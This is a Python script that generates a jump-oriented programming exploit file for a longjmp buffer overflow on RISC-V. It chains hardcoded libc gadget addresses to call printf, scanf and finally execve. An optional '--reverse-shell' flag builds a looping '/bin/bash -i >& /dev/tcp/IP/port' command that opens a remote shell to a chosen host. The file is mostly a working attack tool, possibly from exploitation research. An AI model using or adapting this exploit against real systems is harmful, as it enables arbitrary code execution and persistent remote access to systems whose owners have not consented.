import argparse
import ast
import binascii

def str_to_hexvalues(string):
    buf = []
    # Null terminate the string
    nullt = string + '\0'
    # Add more null terminators until the string is 8-byte aligned
    for i in range(len(nullt) % 8, 8):
        nullt += '\0'

    # Store the hexademical values of the string in the buffer
    for i in range(int(len(nullt) / 8)):
        # Convert this 8-byte slice of a string to an integer - reverse the the byte order
        hexstring = binascii.hexlify(bytes(nullt[i*8:(i+1)*8], 'ascii')[::-1])
        hexvalue = int(hexstring, 16)
        buf.append(hexvalue)
    return buf

# Abstract buffer class for printing/size
class buffer:
    def __str__(self):
        return '\n'.join([format(h, 'x') for h in self.buf]) + '\n'
    def size(self):
        return len(self.buf) * 8

# Buffer full of zeros
class zeroBuf(buffer):
    def __init__(self, address, words = None, bytelen = None):
        if bytelen is not None:
            words = int(bytelen / 8)
        self.buf = [0 for i in range(words)]
        self.address = address

# Buffer with string array
class stringArrayBuf(buffer):
    def __init__(self, address, strings):
        self.address = address
        # Null terminate the array of string pointers
        charptrarray_len = len(strings) + 1
        # Setup pointers to the strings plus a null pointer
        self.buf = [0 for i in range(charptrarray_len)]
        for index, string in enumerate(strings):
            # Store the pointer to where this string's data will start
            self.buf[index] = address + (len(self.buf)*8)
            hexvalues = str_to_hexvalues(string)
            for h in hexvalues:
                self.buf.append(h)

# longjmp buffer containing registers to load
class longjmpBuf(buffer):
    def __init__(self, buf_ptr = None):
        self.buf = [0 for i in range(25)]

    def set_ra(self, ra):
        self.buf[0] = ra
    def set_s0(self, s0):
        self.buf[1] = s0
    def set_s1(self, s1):
        self.buf[2] = s1
    def set_s2(self, s2):
        self.buf[3] = s2
    def set_s3(self, s3):
        self.buf[4] = s3
    def set_s4(self, s4):
        self.buf[5] = s4
    def set_s5(self, s5):
        self.buf[6] = s5
    def set_s6(self, s6):
        self.buf[7] = s6
    def set_s7(self, s7):
        self.buf[8] = s7
    def set_s8(self, s8):
        self.buf[9] = s8
    def set_s9(self, s9):
        self.buf[10] = s9
    def set_s10(self, s10):
        self.buf[11] = s10
    def set_s11(self, s11):
        self.buf[12] = s11
    def set_sp(self, sp):
       self.buf[13] = sp

# buffer for dispatch/initializer gadget to load registers from
class dispatchBuf(buffer):
    def __init__(self, buf_ptr):
        self.buf = [0 for i in range(27)]
        if isinstance(buf_ptr, int):
            # The gadget loads registers from *(t0+176) through *(t0+392)
            self.dispatch_buf = buf_ptr - 176
            # The total number of bytes it reads 216 bytes
            self.next_dispatch_buf = buf_ptr + self.size()
        else:
            self.dispatch_buf = buf_ptr.next_dispatch_buf - 176
            self.next_dispatch_buf = buf_ptr.next_dispatch_buf + self.size()

        # Point the next t0 to the next buf address minus the 176 byte offset
        self.set_s3(self.next_dispatch_buf - 176)
    
    def set_t1(self, t1):
        self.buf[0] = t1
    def set_ra(self, ra):
        self.buf[1] = ra
    def set_sp(self, sp):
        self.buf[2] = sp
    def set_a0(self, a0):
        self.buf[10] = a0
    def set_a1(self, a1):
        self.buf[11] = a1
    def set_a2(self, a2):
        self.buf[12] = a2
    def set_a3(self, a3):
        self.buf[13] = a3
    def set_a4(self, a4):
        self.buf[14] = a4
    def set_a5(self, a5):
        self.buf[15] = a5
    def set_a6(self, a6):
        self.buf[16] = a6
    def set_a7(self, a7):
        self.buf[17] = a7
    def set_s0(self, s0):
        self.buf[8] = s0
    def set_s1(self, s1):
        self.buf[9] = s1
    def set_s2(self, s2):
        self.buf[18] = s2
    def set_s3(self, s3):
        self.buf[19] = s3
    def set_s4(self, s4):
        self.buf[20] = s4
    def set_s5(self, s5):
        self.buf[21] = s5
    def set_s6(self, s6):
        self.buf[22] = s6
    def set_s7(self, s7):
        self.buf[23] = s7

# Helper function to print strings by chaining calls to putchar
def print_string(string, bufs):
    for c in string:
        buf = dispatchBuf(bufs[-1])
        # Jump to gadget which sets the next dispatcher buf
        buf.set_t1(mv_s3_to_t0_jalr_a3)
        # Then jump to putchar
        buf.set_a3(putchar)
        buf.set_a0(ord(c))
        # Return to dispatcher gadget after putchar finishes
        buf.set_ra(load_regs_from_t0)
        # Set the stack to the second buf ptr as this shouldn't be used anymore
        buf.set_sp(bufs[-1].dispatch_buf)
        bufs.append(buf)

# Pointer values
load_regs_from_t0 = 0x20000648da
mv_s3_to_t0_jalr_a3 = 0x200007be24
mv_s0_to_a3_jalr_s9 = 0x200004b38c
execve = 0x20000ad180
putchar = 0x2000080bcc
printf = 0x200006a48c
fprintf = 0x200006a44a
sprintf = 0x200006a51e
scanf = 0x200006a63a
mv_a3s2_a2s7_a1s6_a0s3_jalr_s1 = 0x2000096722
ld_s1_to_a1_jalr_s7 = 0x20000596ba
ld_s0_to_a5_a1_jalr_a5 = 0x20000e8b56
ld_s0_to_a1_jalr_a5 = 0x20000e8b58  # moves s1 to a0
mv_a1_to_s8_jalr_a5 = 0x20000f810a
mv_a1_to_s8_jalr_s6 = 0x20000bffe2
mv_s8_to_a2_jalr_s4 = 0x200004c7f0
mv_s6_to_a0_jalr_s5 = 0x200008356a

# Unused pointers
bin_sh_str = 0x20001178a8
mv_a0a1a2_jalr_a5 = 0x2000067010
jalr_a5 = 0x200006701a

# Command line options
parser = argparse.ArgumentParser(description='Generate JOP exploit file for longjmp buffer overflow')
parser.add_argument('-o', '--out', type=str, help='output file name', default='dispatch.txt')
parser.add_argument('-m', '--msg', type=str, help='string to print out', default='RISC-V JOP Success')
parser.add_argument('--buffer-size', type=int, help='size of buffer to overflow', default=10000)
parser.add_argument('--buffer-address', type=lambda x: int(x,0), help='address of overflowable buffer', default=0x2aaaaad480)
parser.add_argument('-e','--execve', type=ast.literal_eval, help="python list of strings to execve: \"['/bin/bash', '-c', 'echo \\'run a script\\'; echo \\'like this\\'; /bin/bash']\"", default=["/bin/bash"])
parser.add_argument('-r', '--reverse-shell', type=str, metavar='IP:port', help="Spin on opening a reverse shell to IP:port - overrides execve argument")
args = parser.parse_args()

if args.reverse_shell is not None:
    IP, port = args.reverse_shell.split(':')
    print('exploit will open reverse shell to:', IP, port)
    # Keep on retrying to open the reverse shell with while true
    args.execve = ['/bin/bash', '-c', 'cd /\n while true; do\n /bin/bash -i 2>/dev/null >& /dev/tcp/' + IP + '/' + port + ' 0>&1\n done\n']

dispatch_file = open(args.out, 'w')

# Need the actual in-memory address of the dispatchBuf to get started (&f->buffer)
# Chain gadgets to get some space to reuse as the stack for putchar
# These can replaced with zero bufs, in which case the JOP chain would start from a later buf
# TODO: try finding a way to increment t0 instead of needing its address - no luck in libc
buf1 = dispatchBuf(args.buffer_address)
buf1.set_t1(mv_s3_to_t0_jalr_a3)
buf1.set_a3(load_regs_from_t0)

buf2 = dispatchBuf(buf1)
buf2.set_t1(mv_s3_to_t0_jalr_a3)
buf2.set_a3(load_regs_from_t0)

bufs = [buf1, buf2]

# Check if the exploit should print a message
if args.msg != None and args.msg != '':
    # Add more dispatch buffers to chain calls to putchar
    print_string(args.msg + '\n', bufs)

# Jop Chain to call printf() with three format specifiers (4 args)
pbuf = dispatchBuf(bufs[-1])
printfvalues = str_to_hexvalues('\nsubs:\n\t%%d:\t%d\n\t%%x:\t%x\n\t%%s:\t%s\n\n')
substrvalues = str_to_hexvalues('a string')
j = 20
bufs_offset = 22
printfstr_pointer = pbuf.dispatch_buf + 8*(j + bufs_offset)
for i in range(len(printfvalues)):
    pbuf.buf[j] = printfvalues[i]
    j = j + 1
substr_pointer = pbuf.dispatch_buf + 8*(j + bufs_offset)
for i in range(len(substrvalues)):
    pbuf.buf[j] = substrvalues[i]
    j = j + 1
pbuf.set_t1(printf)
# printf() string
pbuf.set_a0(printfstr_pointer)
# printf() format specifiers
pbuf.set_a1(13371337)
pbuf.set_a2(0xdeadbeef)
pbuf.set_a3(substr_pointer)
pbuf.set_sp(bufs[-3].dispatch_buf)
pbuf.set_ra(mv_a3s2_a2s7_a1s6_a0s3_jalr_s1)
pbuf.set_s1(mv_s3_to_t0_jalr_a3)
pbuf.set_s2(load_regs_from_t0)

bufs.append(pbuf)

# Jop chain 
printBuf = dispatchBuf(bufs[-1])
printBuf.set_t1(mv_s3_to_t0_jalr_a3)
printBuf.set_a3(printf)
strvalues = str_to_hexvalues('Type in your your name: ')
for i in range(len(strvalues)):
    printBuf.buf[i + 20] = strvalues[i]
printBuf.set_a0(printBuf.dispatch_buf + 336) # buf[20]
printBuf.set_sp(bufs[-2].dispatch_buf)
printBuf.set_ra(load_regs_from_t0)
bufs.append(printBuf)


# Jop Chain to call scanf() (read a string)
scanbuf = zeroBuf(address=bufs[-1].next_dispatch_buf, words=256)
bufs[-1].set_s3(scanbuf.address + scanbuf.size() - 176)
sbuf = dispatchBuf(scanbuf.address + scanbuf.size())
scanfvalues = str_to_hexvalues('%s')
scanstr_pointer = scanbuf.address + scanbuf.size() - 80
j = 20
bufs_offset = 22
scanfstr_pointer = sbuf.dispatch_buf + 8*(j + bufs_offset)
for i in range(len(scanfvalues)):
    sbuf.buf[j] = scanfvalues[i]
    j = j + 1
sbuf.set_t1(scanf)
sbuf.set_a0(scanfstr_pointer)
sbuf.set_a1(scanstr_pointer)
sbuf.set_sp(bufs[-3].dispatch_buf)
# Jop Chain to call scanf() (read a string)
sbuf.set_ra(mv_a3s2_a2s7_a1s6_a0s3_jalr_s1)
sbuf.set_s1(mv_s3_to_t0_jalr_a3)
sbuf.set_s2(load_regs_from_t0)

bufs.append(scanbuf)
bufs.append(sbuf)

printBuf = dispatchBuf(bufs[-1])
printBuf.set_t1(mv_s3_to_t0_jalr_a3)
printBuf.set_a3(printf)
strvalues = str_to_hexvalues('Type in a number: ')
for i in range(len(strvalues)):
    printBuf.buf[i + 20] = strvalues[i]
printBuf.set_a0(printBuf.dispatch_buf + 336) # buf[20]
printBuf.set_sp(scanbuf.address - 1024)
printBuf.set_ra(load_regs_from_t0)
bufs.append(printBuf)


# Jop Chain to call scanf() (read a number)
sbuf = dispatchBuf(bufs[-1])
scanfvalues = str_to_hexvalues('%d')
scanint_pointer = scanstr_pointer - 8
j = 20
bufs_offset = 22
scanfstr_pointer = sbuf.dispatch_buf + 8*(j + bufs_offset)
for i in range(len(scanfvalues)):
    sbuf.buf[j] = scanfvalues[i]
    j = j + 1
sbuf.set_t1(scanf)
sbuf.set_a0(scanfstr_pointer)
sbuf.set_a1(scanint_pointer)
sbuf.set_sp(scanbuf.address - 512)
sbuf.set_ra(mv_a3s2_a2s7_a1s6_a0s3_jalr_s1)
sbuf.set_s1(mv_s3_to_t0_jalr_a3)
sbuf.set_s2(load_regs_from_t0)
# Jop Chain to call scanf() (read a number)

bufs.append(sbuf)

# Jop Chain to call printf() on the scanned string
stringbuf = zeroBuf(address=bufs[-1].next_dispatch_buf, words=32)
bufs[-1].set_s3(stringbuf.address + stringbuf.size() - 176)
pbuf = dispatchBuf(stringbuf.address + stringbuf.size())
printfvalues = str_to_hexvalues('\tYou entered this name: %s\n')
printfstr_pointer = stringbuf.address
for i in range(len(printfvalues)):
    stringbuf.buf[i] = printfvalues[i]
pbuf.set_t1(printf)
pbuf.set_a0(printfstr_pointer)
pbuf.set_a1(scanstr_pointer)
pbuf.set_sp(scanbuf.address - 512)
pbuf.set_ra(mv_a3s2_a2s7_a1s6_a0s3_jalr_s1)
pbuf.set_s1(mv_s3_to_t0_jalr_a3)
pbuf.set_s2(load_regs_from_t0)
# Jop Chain to call printf() on the scanned string
bufs.append(stringbuf)
bufs.append(pbuf)


# Jop Chain to call printf() on number that were entered
stringbuf = zeroBuf(address=bufs[-1].next_dispatch_buf, words=32)
bufs[-1].set_s3(stringbuf.address + stringbuf.size() - 176)
pbuf = dispatchBuf(stringbuf.address + stringbuf.size())
printfvalues = str_to_hexvalues('\tYou typed this number: %1$d\n\t\t  Hexadecimal: 0x%1$x\n')
printfstr_pointer = stringbuf.address
for i in range(len(printfvalues)):
    stringbuf.buf[i] = printfvalues[i]
pbuf.set_s0(scanint_pointer - 16)
pbuf.set_s4(scanint_pointer + 72 - 16) # make s4 match stack pointer check
pbuf.set_t1(ld_s0_to_a1_jalr_a5)       # clobbers a0 with s1
pbuf.set_a5(mv_s6_to_a0_jalr_s5)
pbuf.set_s6(printfstr_pointer)
pbuf.set_s5(printf)
pbuf.set_sp(scanint_pointer - 16 - 96)
pbuf.set_s2(load_regs_from_t0)
pbuf.set_s1(mv_s3_to_t0_jalr_a3)
pbuf.set_ra(mv_a3s2_a2s7_a1s6_a0s3_jalr_s1)

# Stackbuf for printf - to continue the jop chain
scanbuf.buf[-14] = mv_a3s2_a2s7_a1s6_a0s3_jalr_s1    # ra
scanbuf.buf[-15] = 0x1111111111111111                # s0
scanbuf.buf[-16] = mv_s3_to_t0_jalr_a3               # s1
scanbuf.buf[-17] = load_regs_from_t0                 # s2
scanbuf.buf[-18] = pbuf.next_dispatch_buf - 176      # s3
bufs.append(stringbuf)
bufs.append(pbuf)

printBuf = dispatchBuf(bufs[-1])
printBuf.set_t1(mv_s3_to_t0_jalr_a3)
printBuf.set_a3(printf)
strvalues = str_to_hexvalues('\nContinuing JOP to execve call\n\n')
for i in range(len(strvalues)):
    printBuf.buf[i + 20] = strvalues[i]
printBuf.set_a0(printBuf.dispatch_buf + 336) # buf[20]
printBuf.set_sp(scanbuf.address - 1024)
printBuf.set_ra(load_regs_from_t0)
bufs.append(printBuf)


execve_strbuf = stringArrayBuf(bufs[-1].next_dispatch_buf, args.execve)

# Have the last gadget jump past this string buffer
bufs[-1].set_s3(execve_strbuf.address + execve_strbuf.size() - 176)
bufs.append(execve_strbuf)

# Final buffer jumps to execve. It starts after the string array buffer
final_buf = dispatchBuf(execve_strbuf.address + execve_strbuf.size())
# Set the first argument to the first strihng in the string buf - the executable to run
final_buf.set_a0(execve_strbuf.buf[0])
# Pass the entire char*[] to the second argument
final_buf.set_a1(execve_strbuf.address)
final_buf.set_a2(0)
final_buf.set_t1(execve)
bufs.append(final_buf)


# Compute the size of the dispatch buffer and check if they will fit

dispatchbufs_size = sum(buf.size() for buf in bufs)
remaining_size = args.buffer_size - dispatchbufs_size
if remaining_size < 0:
    print("Vulnerable buffer isn't large enough to run this attack:")
    print("\tsize of exploit buffer:   ", dispatchbufs_size)
    print("\tsize of vulnerable buffer:", args.buffer_size)
    exit(1)

# Write out the dispatch buffers to the file
for buf in bufs:
    dispatch_file.write(str(buf))

# Fill the remaining part of the vulnerable buffer with zeros
if remaining_size > 0:
    empty_buf = zeroBuf(address=bufs[-1].next_dispatch_buf, bytelen=remaining_size)
    dispatch_file.write(str(empty_buf))

# Buffer for registers to be loaded by longjmp
longjmp = longjmpBuf()
# s3 is copied to t0 and should point to the first dispatch buf
longjmp.set_s3(bufs[0].dispatch_buf)
# First jump to the gadget to set a3 from s0
longjmp.set_ra(mv_s0_to_a3_jalr_s9)
# After that, jump to the gadget to set t0 from s3
longjmp.set_s9(mv_s3_to_t0_jalr_a3)
# Finally, that gadget will jump to a3 which should point to the initializer gadget
longjmp.set_s0(load_regs_from_t0)

# Fill out the overflow portion of the buffer with the longjmp registers
dispatch_file.write(str(longjmp))

dispatch_file.close()
